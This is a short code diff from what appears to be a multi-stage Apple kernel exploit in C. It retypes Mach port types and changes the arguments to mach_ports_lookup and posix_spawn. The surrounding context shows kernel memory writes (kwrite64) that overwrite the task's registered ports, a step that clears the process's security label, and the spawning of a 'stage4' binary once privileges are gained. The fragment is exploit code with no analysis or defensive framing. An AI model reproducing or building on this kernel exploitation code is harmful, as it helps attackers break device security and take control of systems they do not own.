@@ -25,7 +25,7 @@ typedef uint64_t mach_vm_address_t;
 typedef unsigned int mach_msg_type_number_t;
 typedef uint32_t io_connect_t;
 typedef uint32_t mach_port_name_t;
-typedef void* task_t;
+typedef mach_port_t task_t;
 typedef mach_port_t vm_map_t;
 typedef uint64_t mach_vm_size_t;
 typedef uint64_t mach_msg_timeout_t;
@@ -35,7 +35,7 @@ typedef uint64_t mach_msg_return_t;
 typedef uint64_t mach_vm_offset_t;
 typedef uint32_t mach_port_right_t;
 typedef bool boolean_t;
-typedef void* ipc_space_t;
+typedef mach_port_t ipc_space_t;
 typedef unsigned int vm_inherit_t;
 typedef uint64_t mach_port_poly_t; // ???
 typedef uint32_t mach_msg_type_name_t;
@@ -429,7 +429,7 @@ init_var:
         kwrite64(curr_task + offsets->struct_offsets.itk_registered + 0x0, ptrs[0]);
         kwrite64(curr_task + offsets->struct_offsets.itk_registered + 0x8, ptrs[1]);
 
-        ret = offsets->userland_funcs.mach_ports_lookup(offsets->userland_funcs.mach_task_self(), &maps, &maps_num);
+        ret = offsets->userland_funcs.mach_ports_lookup(offsets->userland_funcs.mach_task_self(), maps, &maps_num);
         VERIFY_MACH("failed to lookup mach ports: ");
 
     case 14:
@@ -500,7 +500,7 @@ init_var:
         LOG_HEX64("wrote new port: ", new_port);
 
     case 23:
-        ret = offsets->userland_funcs.mach_ports_lookup(offsets->userland_funcs.mach_task_self(), &maps, &maps_num);
+        ret = offsets->userland_funcs.mach_ports_lookup(offsets->userland_funcs.mach_task_self(), maps, &maps_num);
         VERIFY_MACH("failed to lookup mach ports: ");
 
     case 24:
@@ -521,7 +521,7 @@ init_var:
         kwrite64(our_label + 0x10, 0x0);
 
         // spawn the other bin
-        offsets->userland_funcs.posix_spawn(&pid, "/mystuff/stage4", NULL, NULL, NULL, NULL);
+        offsets->userland_funcs.posix_spawn(pid, "/mystuff/stage4", NULL, NULL, NULL, NULL);
 
         LOG("finally spawned stage 4 what a ride");
         // fallthrough, we want to exit now
